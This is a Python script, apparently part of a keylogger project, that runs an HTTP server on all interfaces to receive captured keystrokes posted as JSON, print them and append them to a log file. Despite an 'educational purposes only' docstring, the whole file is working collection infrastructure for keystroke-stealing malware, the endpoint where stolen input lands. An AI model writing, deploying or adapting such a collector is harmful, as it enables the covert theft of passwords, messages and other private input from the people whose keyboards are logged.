#!/usr/bin/env python3
"""
Simple HTTP Server to receive keylogger data from the python-keylogger.
Educational purposes only - Use only on systems you own or have permission to test.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sys
from datetime import datetime

class KeyloggerHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            keyboard_data = data.get('keyboardData', '')
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(f"\n[{timestamp}] Received keylogger data:")
            print(f"  Length: {len(keyboard_data)} chars")
            print(f"  Data: {repr(keyboard_data)}")
            
            # Save to log file
            with open('keylogger_log.txt', 'a') as f:
                f.write(f"[{timestamp}] {keyboard_data}\n")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "ok"}')
            
        except json.JSONDecodeError:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'{"error": "Invalid JSON"}')
        except Exception as e:
            print(f"Error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>Keylogger Server Running</h1><p>POST keylogger data to /</p>')
    
    def log_message(self, format, *args):
        # Suppress default log messages
        pass

def run_server(host='0.0.0.0', port=8080):
    server = HTTPServer((host, port), KeyloggerHandler)
    print(f"Keylogger server starting on {host}:{port}")
    print("Press Ctrl+C to stop")
    print("Waiting for keylogger connections...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server...")
        server.shutdown()

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    run_server(port=port)